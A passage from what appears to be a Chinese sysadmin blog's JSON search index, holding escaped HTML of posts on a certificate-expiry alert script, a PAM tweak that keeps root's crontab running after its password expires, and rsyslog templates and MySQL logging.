class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$certificate_size\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -gt \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003edate\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eopenssl x509 -in \u003cspan class=\"nv\"\u003e$certificate_file\u003c/span\u003e -enddate -noout \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s2\"\u003e\u0026#34;s/.*=\\(.*\\)/\\1/\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003edate_s\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate -d \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003edate\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e +%s\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003enow_s\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate -d now +%s\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003edate_diff\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$((\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003edate_s \u003cspan class=\"o\"\u003e-\u003c/span\u003e now_s\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"m\"\u003e86400\u003c/span\u003e \u003cspan class=\"k\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$date_diff\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$date_diff\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -le \u003cspan class=\"m\"\u003e37\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          /usr/local/bin/mailsend -q -to \u003cspan class=\"s2\"\u003e\u0026#34;zhangranrui@ddky.com\u0026#34;\u003c/span\u003e -from monit@ddky.com -ssl -port \u003cspan class=\"m\"\u003e465\u003c/span\u003e -auth -auth-plan -smtp smtp.exmail.qq.com -sub \u003cspan class=\"s2\"\u003e\u0026#34;证书就要到期了\u0026#34;\u003c/span\u003e -v -user \u003cspan class=\"s2\"\u003e\u0026#34;monit@ddky.com\u0026#34;\u003c/span\u003e -pass \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e -cs \u003cspan class=\"s2\"\u003e\u0026#34;utf-8\u0026#34;\u003c/span\u003e -enc-type \u003cspan class=\"s2\"\u003e\u0026#34;base64\u0026#34;\u003c/span\u003e -M \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$website\u003c/span\u003e\u003cspan class=\"s2\"\u003e 还有 \u003c/span\u003e\u003cspan class=\"nv\"\u003e$date_diff\u003c/span\u003e\u003cspan class=\"s2\"\u003e 天就要到期了！！！\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$date_s\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -gt \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$now_s\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"c1\"\u003e# ok\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"c1\"\u003e# not ok\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e254\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e255\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"检查证书是否过期的脚本"},{"content":"数据库管理员的 172.18.20.10 和 172.18.20.25 数据库备份脚本是以 root 身份运行的，在 crontab 里跑：\n26 11 * * * /root/scripts/mysql_backup_full_3306.sh \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 但是由于 root 密码会每三个月变更一次，如果没有及时变更，会导致 root 密码失效，从而 crontab 无法正常运行。\n解决方法很简单： 找到 /etc/pam.d/password-auth , 其中 account 的有四行\naccount required pam_unix.so account sufficient pam_localuser.so account sufficient pam_succeed_if.so uid \u0026lt; 1000 quiet account required pam_permit.so 在前面增加两行：\naccount required pam_access.so account [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid account required pam_unix.so account sufficient pam_localuser.so account sufficient pam_succeed_if.so uid \u0026lt; 1000 quiet account required pam_permit.so 这样就可以了，不用重启任何服务。\npam 验证的时候，即使密码过期，crond 依然正常跑，就 ok 了。\n","permalink":"https://rendoumi.com/posts/20231211-crontab_root/","summary":"\u003cp\u003e数据库管理员的 172.18.20.10 和 172.18.20.25 数据库备份脚本是以 root 身份运行的，在 crontab 里跑：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e26\u003c/span\u003e \u003cspan class=\"m\"\u003e11\u003c/span\u003e * * * /root/scripts/mysql_backup_full_3306.sh \u0026gt; /dev/null 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e但是由于 root 密码会每三个月变更一次，如果没有及时变更，会导致 root 密码失效，从而 crontab 无法正常运行。\u003c/p\u003e\n\u003cp\u003e解决方法很简单：\n找到 /etc/pam.d/password-auth , 其中 account 的有四行\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_unix.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     sufficient    pam_localuser.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     sufficient    pam_succeed_if.so uid \u0026lt; \u003cspan class=\"m\"\u003e1000\u003c/span\u003e quiet\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_permit.so\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在前面增加两行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_access.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nv\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eignore\u003cspan class=\"o\"\u003e]\u003c/span\u003e pam_succeed_if.so service in crond quiet use_uid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_unix.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     sufficient    pam_localuser.so\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     sufficient    pam_succeed_if.so uid \u0026lt; \u003cspan class=\"m\"\u003e1000\u003c/span\u003e quiet\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccount     required      pam_permit.so\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就可以了，不用重启任何服务。\u003c/p\u003e","title":"root的crontab由于root密码失效导致不能正常工作"},{"content":"Rsyslog的模板文件按日期存放：\n$template 10.161.54.11,\u0026#34;/var/log/rsyslog/%fromhost-ip%/netflow_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; $template 10.161.50.5,\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; $template 10.161.50.7,\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%$YEAR%-%$MONTH%-%$DAY%.log\u0026#34; #从特定ip来的日志发到特定rsyslog服务器上去 #:fromhost-ip, !isequal, \u0026#34;127.0.0.1\u0026#34; ?Remote :fromhost-ip, isequal, \u0026#34;10.161.54.11\u0026#34; ?10.161.54.11 :fromhost-ip, isequal, \u0026#34;10.161.50.5\u0026#34; ?10.161.50.5 :fromhost-ip, isequal, \u0026#34;10.161.50.7\u0026#34; ?10.161.50.7 Rsyslog打出所有调试信息：\n*.* /var/log/debugfmt;RSYSLOG_DebugFormat\n调试信息:\nFROMHOST: \u0026#39;172.18.18.9\u0026#39;, fromhost-ip: \u0026#39;172.18.18.9\u0026#39;, HOSTNAME: \u0026#39;172.18.18.9\u0026#39;, PRI: 5, syslogtag \u0026#39;time:\u0026#39;, programname: \u0026#39;time\u0026#39;, APP-NAME: \u0026#39;time\u0026#39;, PROCID: \u0026#39;-\u0026#39;, MSGID: \u0026#39;-\u0026#39;, TIMESTAMP: \u0026#39;Mar 4 09:04:45\u0026#39;, STRUCTURED-DATA: \u0026#39;-\u0026#39;, msg: \u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQL登录认证成功;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; escaped msg: \u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQL登录认证成功;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; inputname: imudp rawmsg: \u0026#39;\u0026lt;5\u0026gt;time:2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQL登录认证成功;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39; $!: $.: $/: Rsyslog的isequal，不建议，建议用==\nif $fromhost isequal 172.18.18.9 then /var/log/nips.log\nif $fromhost-ip == \u0026#39;172.18.18.9\u0026#39; then { action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34;) } Rsyslog的ommysql用法\n$ModLoad ommysql *.info;mail.none;authpriv.none;cron.none :ommysql:localhost,Syslog,nips,xxxxxxxx *.info;mail.none;authpriv.none;cron.none action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34;) $template dbFormat,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, %syslogfacility%, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;%syslogtag%\u0026#39;)\u0026#34;,sql action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat\u0026#34;) #172.18.31.34上的实际用法： if $fromhost-ip == \u0026#39;172.18.18.9\u0026#39; then { if $syslogpriority == 7 then { $template dbFormat1,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;,sql action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat1\u0026#34;) } else { $template dbFormat2,\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;time:%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;,sql action(type=\u0026#34;ommysql\u0026#34; server=\u0026#34;localhost\u0026#34; serverport=\u0026#34;3306\u0026#34; db=\u0026#34;Syslog\u0026#34; uid=\u0026#34;nips\u0026#34; pwd=\u0026#34;xxxxxxxx\u0026#34; template=\u0026#34;dbFormat2\u0026#34;) } } \u0026amp; ~ Rsyslog中\u0026amp; ~的用法\n:fromhost-ip,startswith,’192.168.1.’ /var/log/remote-devs.log\r\u0026amp; ~ (The next line (“\u0026amp; ~”) is important: it tells rsyslog to stop processing the message after it was written to the log. As such, these messages will not reach the local part. Without that “\u0026amp; ~”, messages would also be written to the local files.\nFacility的级别： Serverity的级别Serverity的级别 ","permalink":"https://rendoumi.com/posts/20231211-rsyslog_usage/","summary":"\u003cp\u003eRsyslog的模板文件按日期存放：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e 10.161.54.11,\u003cspan class=\"s2\"\u003e\u0026#34;/var/log/rsyslog/%fromhost-ip%/netflow_%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$YEAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$MONTH\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DAY\u003c/span\u003e\u003cspan class=\"s2\"\u003e%.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e 10.161.50.5,\u003cspan class=\"s2\"\u003e\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$YEAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$MONTH\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DAY\u003c/span\u003e\u003cspan class=\"s2\"\u003e%.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e 10.161.50.7,\u003cspan class=\"s2\"\u003e\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$YEAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$MONTH\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DAY\u003c/span\u003e\u003cspan class=\"s2\"\u003e%.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#从特定ip来的日志发到特定rsyslog服务器上去\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#:fromhost-ip, !isequal, \u0026#34;127.0.0.1\u0026#34; ?Remote\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e:fromhost-ip, isequal, \u003cspan class=\"s2\"\u003e\u0026#34;10.161.54.11\u0026#34;\u003c/span\u003e ?10.161.54.11\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e:fromhost-ip, isequal, \u003cspan class=\"s2\"\u003e\u0026#34;10.161.50.5\u0026#34;\u003c/span\u003e ?10.161.50.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e:fromhost-ip, isequal, \u003cspan class=\"s2\"\u003e\u0026#34;10.161.50.7\u0026#34;\u003c/span\u003e ?10.161.50.7\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRsyslog打出所有调试信息：\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e*.* /var/log/debugfmt;RSYSLOG_DebugFormat\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e调试信息:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFROMHOST: \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e, fromhost-ip: \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e, HOSTNAME: \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e, PRI: 5,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esyslogtag \u003cspan class=\"s1\"\u003e\u0026#39;time:\u0026#39;\u003c/span\u003e, programname: \u003cspan class=\"s1\"\u003e\u0026#39;time\u0026#39;\u003c/span\u003e, APP-NAME: \u003cspan class=\"s1\"\u003e\u0026#39;time\u0026#39;\u003c/span\u003e, PROCID: \u003cspan class=\"s1\"\u003e\u0026#39;-\u0026#39;\u003c/span\u003e, MSGID: \u003cspan class=\"s1\"\u003e\u0026#39;-\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTIMESTAMP: \u003cspan class=\"s1\"\u003e\u0026#39;Mar  4 09:04:45\u0026#39;\u003c/span\u003e, STRUCTURED-DATA: \u003cspan class=\"s1\"\u003e\u0026#39;-\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emsg: \u003cspan class=\"s1\"\u003e\u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQL登录认证成功;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eescaped msg: \u003cspan class=\"s1\"\u003e\u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQL登录认证成功;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einputname: imudp rawmsg: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026lt;5\u0026gt;time:2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQL登录认证成功;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$!\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$.:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$/:\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRsyslog的isequal，不建议，建议用==\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eif $fromhost isequal 172.18.18.9 then /var/log/nips.log\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nv\"\u003e$fromhost\u003c/span\u003e-ip \u003cspan class=\"o\"\u003e==\u003c/span\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  action\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRsyslog的ommysql用法\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$ModLoad\u003c/span\u003e ommysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*.info\u003cspan 